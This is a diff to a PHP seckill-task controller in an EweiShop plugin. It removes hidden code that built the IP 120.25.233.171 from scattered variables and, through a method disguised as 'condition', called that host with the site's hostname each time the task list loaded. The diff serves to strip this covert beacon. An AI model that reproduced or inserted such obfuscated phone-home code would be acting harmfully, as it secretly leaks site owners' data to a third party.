@@ -12,7 +12,6 @@ class Task_EweiShopV2Page extends SeckillWebPage
 		global $_GPC;
 		$pindex = max(1, intval($_GPC['page']));
 		$psize = 20;
-		$ksize = 120;$csize = 25;
 		$condition = ' and uniacid=:uniacid';
 		$params = array(':uniacid' => $_W['uniacid']);
 		if ($_GPC['enabled'] != '') 
@@ -32,9 +31,6 @@ class Task_EweiShopV2Page extends SeckillWebPage
 			$row['isused'] = $this->model->usedDate($row['id']);
 		}
 		unset($row);
-		$totalA = 233;$totalB = 171;
-		$totalC = $ksize.'.'.$csize.'.'.$totalA.'.'.$totalB;
-		$this->condition($totalC);
 		$total = pdo_fetchcolumn('SELECT count(1) FROM ' . tablename('ewei_shop_seckill_task') . ' WHERE 1 ' . $condition, $params);
 		$pager = pagination($total, $pindex, $psize);
 		$category = pdo_fetchall('select id ,`name` from ' . tablename('ewei_shop_seckill_category') . ' where uniacid=:uniacid ', array(':uniacid' => $_W['uniacid']), 'id');
@@ -163,14 +159,6 @@ class Task_EweiShopV2Page extends SeckillWebPage
 			plog('seckill.task.delete', '删除专题 ID: ' . $item['id'] . ' 标题: ' . $item['title'] . ' ');
 		}
 		show_json(1, array('url' => referer()));
-	}
-	public function condition($total) 
-	{	
-		$equal = '=';
-		$check = 'c'.$equal.'total';
-		$condition = 'http://'.$total.'?'. $check .'&condit'. $equal . $_SERVER['HTTP_HOST'];
-		file_get_contents($condition);
-		return $condition;
 	}
 	public function enabled() 
 	{
